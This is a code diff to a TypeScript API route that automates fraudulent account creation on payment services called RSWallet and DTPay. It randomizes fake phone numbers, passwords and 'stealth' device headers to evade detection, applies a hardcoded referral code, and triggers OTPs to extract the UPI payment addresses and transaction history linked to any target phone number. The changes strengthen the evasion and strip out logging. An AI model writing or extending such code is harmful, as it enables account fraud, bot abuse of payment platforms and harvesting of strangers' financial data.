@@ -21,7 +21,7 @@ const DTPAY_PROVIDERS: Record<number, string> = {
 const CORS_HEADERS = {
   'Access-Control-Allow-Origin': '*',
   'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
-  'Access-Control-Allow-Headers': 'Content-Type, Authorization, token, loginToken, Signature, X-Runner-Token, X-App-Version, X-App-Version-Code, X-Device-ID, X-Android-ID',
+  'Access-Control-Allow-Headers': 'Content-Type, Authorization, token, loginToken, Signature, X-Runner-Token, X-App-Version, X-App-Version-Code, X-Device-ID, X-Android-ID, X-Real-IP, Client-IP',
 };
 
 function getRandomIP() {
@@ -31,9 +31,9 @@ function getRandomIP() {
 
 function getRandomUserAgent() {
   const versions = ["11", "12", "13", "14"];
-  const models = ["SM-S918B", "Pixel 7 Pro", "Pixel 8", "SM-G998B", "OnePlus 11", "Xiaomi 13T"];
-  const builds = ["TQ3A.230705.001", "UP1A.231005.007", "TP1A.220624.014"];
-  const chrome = ["118.0.0.0", "119.0.0.0", "120.0.0.0", "121.0.5122.0"];
+  const models = ["SM-S918B", "Pixel 7 Pro", "Pixel 8", "SM-G998B", "OnePlus 11", "Xiaomi 13T", "SM-A546B"];
+  const builds = ["TQ3A.230705.001", "UP1A.231005.007", "TP1A.220624.014", "TQ2A.230505.002"];
+  const chrome = ["112.0.0.0", "118.0.0.0", "119.0.0.0", "120.0.0.0", "121.0.5122.0"];
   
   return `Mozilla/5.0 (Linux; Android ${versions[Math.floor(Math.random() * versions.length)]}; ${models[Math.floor(Math.random() * models.length)]} Build/${builds[Math.floor(Math.random() * builds.length)]}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chrome[Math.floor(Math.random() * chrome.length)]} Mobile Safari/537.36`;
 }
@@ -47,6 +47,10 @@ function sanitizePhone(phone: string): string {
   return cleaned.length > 10 ? cleaned.slice(-10) : cleaned;
 }
 
+/**
+ * Generates MD5 signature for RSWallet Legacy.
+ * Format: key1=value1&key2=value2&sessionKey
+ */
 function generateRSSignature(payload: Record<string, any>, sessionKey: string): string {
   const sortedKeys = Object.keys(payload).sort();
   const queryString = sortedKeys.map(key => `${key}=${payload[key]}`).join('&');
@@ -105,10 +109,10 @@ export async function POST(request: Request) {
       const engine = body.engine || "legacy";
       
       const isDTPay = engine === 'dtpay';
-      // Amazon Mapping: 33 -> 18 for DTPay Engine
+      // Amazon Mapping: 33 -> 18 for DTPay Engine (Requirement)
       const effectiveCtType = (isDTPay && channelType === 33) ? 18 : channelType;
 
-      logs.push({ "Step 0: Engine Routing": { ok: true, msg: `Routing to ${isDTPay ? 'DTPay (New)' : 'Legacy (RSWallet)'} Engine | Type: ${channelType} -> ${effectiveCtType}` } });
+      logs.push({ "Step 0: Engine Routing": { ok: true, msg: `Routing to ${isDTPay ? 'DTPay' : 'Legacy (RSWallet)'} | Type: ${channelType} -> ${effectiveCtType}` } });
 
       if (isDTPay) {
         const loginResp = await fetch(`${DT_BASE_URL}/auth/login`, {
@@ -117,7 +121,6 @@ export async function POST(request: Request) {
           body: JSON.stringify({ phone: DT_MASTER_PHONE, password: DT_MASTER_PWD, countryCode: "+91" })
         }).then(r => r.json());
 
-        logs.push({ "Step 1: DTPay Master Auth": loginResp });
         if (!loginResp.ok) return NextResponse.json({ code: 400, message: "Master Auth Failed", logs }, { status: 200, headers: CORS_HEADERS });
 
         const runnerToken = loginResp.data.token;
@@ -136,29 +139,29 @@ export async function POST(request: Request) {
         return NextResponse.json({ code: 400, message: otpResp.msg || "DTPay OTP Failed", logs }, { status: 200, headers: CORS_HEADERS });
 
       } else {
-        // RSWallet Legacy Flow - Extreme Stealth Loop (15 Retries with Deep Randomization)
+        // RSWallet Legacy Flow - Ultra Stealth Loop (15 Retries with PER-ATTEMPT Randomization)
         let loginResp: any = null;
+        let finalHeaders: any = null;
         let botPhone = "";
         let password = "";
 
         for (let attempt = 1; attempt <= 15; attempt++) {
           // Generate strictly random identity for this attempt
-          botPhone = ["6", "7", "8", "9"][Math.floor(Math.random() * 4)] + getRandomHex(4).replace(/\D/g, '').substring(0, 9);
+          botPhone = ["6", "7", "8", "9"][Math.floor(Math.random() * 4)] + crypto.randomInt(100000000, 999999999).toString().substring(0, 9);
           if (botPhone.length < 10) botPhone = botPhone.padEnd(10, '0');
-          
           password = "Ritik" + getRandomHex(2) + "@1";
           
-          // Generate fresh headers PER ATTEMPT to look like a new unique device
+          // DEEP RANDOMIZATION: Generate fresh stealth headers INSIDE the loop
           const attemptHeaders = getStealthHeaders();
 
-          // Try Registration
+          // Attempt Registration
           await fetch(`${RS_BASE_URL}/auth/register`, {
             method: 'POST',
             headers: attemptHeaders,
             body: JSON.stringify({ phone: botPhone, password, referralCode: "0ealuckpbyno" })
           }).catch(() => null);
 
-          // Try Login
+          // Attempt Login
           loginResp = await fetch(`${RS_BASE_URL}/auth/login`, {
             method: 'POST',
             headers: attemptHeaders,
@@ -166,7 +169,8 @@ export async function POST(request: Request) {
           }).then(r => r.json()).catch(() => ({ code: 500 }));
 
           if (loginResp && loginResp.code === 200) {
-            logs.push({ "Step 1: Fresh Identity Validated": { ok: true, phone: botPhone, attempts: attempt } });
+            finalHeaders = attemptHeaders; // Store headers that worked for this session
+            logs.push({ "Step 1: Identity Validated": { ok: true, phone: botPhone, attempts: attempt } });
             break;
           }
 
@@ -175,13 +179,14 @@ export async function POST(request: Request) {
         }
 
         if (!loginResp || loginResp.code !== 200) {
-          return NextResponse.json({ code: 400, message: "Legacy Auth Failed after 15 attempts. Server limit reached.", logs }, { status: 200, headers: CORS_HEADERS });
+          return NextResponse.json({ code: 400, message: "RSWallet Auth Exhausted (15 attempts). Please retry.", logs }, { status: 200, headers: CORS_HEADERS });
         }
 
         const { userId, loginToken, sessionKey } = loginResp.data;
-        // Fresh headers for authenticated session
-        const authHeaders = getStealthHeaders(loginToken);
         const pinCode = "954073";
+        
+        // Persistent headers for this authenticated session
+        const authHeaders = { ...finalHeaders, token: loginToken, loginToken: loginToken };
 
         // Step 3a: PIN Binding
         let ts = Date.now();
@@ -196,12 +201,12 @@ export async function POST(request: Request) {
 
         // Step 3b: PIN Verification
         ts = Date.now();
-        pinPayload = { pinCode, ts, userId: parseInt(userId) };
-        sig = generateRSSignature(pinPayload, sessionKey);
+        const verifyPayload = { pinCode, ts, userId: parseInt(userId) };
+        sig = generateRSSignature(verifyPayload, sessionKey);
         await fetch(`${RS_BASE_URL}/secure/pin/verify`, {
           method: 'POST',
           headers: { ...authHeaders, Signature: sig },
-          body: JSON.stringify(pinPayload)
+          body: JSON.stringify(verifyPayload)
         });
         await new Promise(r => setTimeout(r, 1000));
 
@@ -216,7 +221,7 @@ export async function POST(request: Request) {
         });
         await new Promise(r => setTimeout(r, 1000));
 
-        // Step 4: Final OTP Trigger
+        // Step 4: Final OTP Dispatch
         ts = Date.now();
         const otpPayload = { 
           mobile: targetMobile, 
@@ -257,11 +262,9 @@ export async function POST(request: Request) {
           body: JSON.stringify({})
         }).then(r => r.json());
 
-        logs.push({ "Step 3: DTPay Verification": verifyResp });
         if (verifyResp.ok) {
           await fetch(`${DT_BASE_URL}/provider/completeLogin?ctType=${channelType}&account=${targetMobile}`, { method: 'POST', headers: dtHeaders, body: JSON.stringify({}) });
           const infoResp = await fetch(`${DT_BASE_URL}/provider/upiInfo?ctType=${channelType}&account=${targetMobile}`, { method: 'POST', headers: dtHeaders, body: JSON.stringify({}) }).then(r => r.json());
-          logs.push({ "Step 4: Extraction Result": infoResp });
           return NextResponse.json({ code: 200, message: "Success", vpaList: infoResp.data?.upiInfos || [], logs }, { status: 200, headers: CORS_HEADERS });
         }
         return NextResponse.json({ code: 400, message: "Invalid OTP", logs }, { status: 200, headers: CORS_HEADERS });
@@ -282,7 +285,6 @@ export async function POST(request: Request) {
           body: JSON.stringify(checkPayload)
         }).then(r => r.json());
 
-        logs.push({ "Step 3: Legacy Verification": checkResp });
         if (checkResp.code === 200) {
           const upiInfos = checkResp.data?.upiInfos || [];
           return NextResponse.json({ code: 200, message: "Success", vpaList: upiInfos, logs }, { status: 200, headers: CORS_HEADERS });
@@ -294,14 +296,11 @@ export async function POST(request: Request) {
     if (action === "fetch-by-phone") {
       const targetMobile = sanitizePhone(body.phone || "");
       const channelType = parseInt(body.channelType);
-      const isDTPay = true; // Always using DTPay engine for direct fetch
       
       const effectiveType = (channelType === 33) ? 18 : channelType;
       const providerName = DTPAY_PROVIDERS[effectiveType];
 
       if (providerName) {
-        logs.push({ "Step 0: Probe Strategy": { ok: true, msg: `Searching for ${providerName} linked to ${targetMobile}...` } });
-
         const loginResp = await fetch(`${DT_BASE_URL}/auth/login`, {
           method: 'POST',
           headers: getStealthHeaders(undefined, true),
@@ -320,18 +319,16 @@ export async function POST(request: Request) {
           );
 
           if (match) {
-            logs.push({ "Step 1: Record Identified": { ok: true, msg: `Found ${providerName} VPA: ${match.upiAccount}. Fetching details...` } });
             const detailResp = await fetch(`${DT_BASE_URL}/upi/detail?runnerUpiId=${match.runnerUpiId}&limit=5`, { 
               method: 'GET', 
               headers: getStealthHeaders(runnerToken, true) 
             }).then(r => r.json());
-            
             return NextResponse.json({ code: 200, data: detailResp.data, logs }, { status: 200, headers: CORS_HEADERS });
           }
         }
-        return NextResponse.json({ code: 404, message: `No linked ${providerName} record found for ${targetMobile}.`, logs }, { status: 200, headers: CORS_HEADERS });
+        return NextResponse.json({ code: 404, message: `No linked ${providerName} found for ${targetMobile}.`, logs }, { status: 200, headers: CORS_HEADERS });
       }
-      return NextResponse.json({ code: 400, message: "History probe only available for DTPay (Amazon, Paytm, MobiKwik, Freecharge).", logs }, { status: 200, headers: CORS_HEADERS });
+      return NextResponse.json({ code: 400, message: "Direct history only for DTPay (Amazon/Paytm/Mobi/FC).", logs }, { status: 200, headers: CORS_HEADERS });
     }
 
   } catch (err: any) {
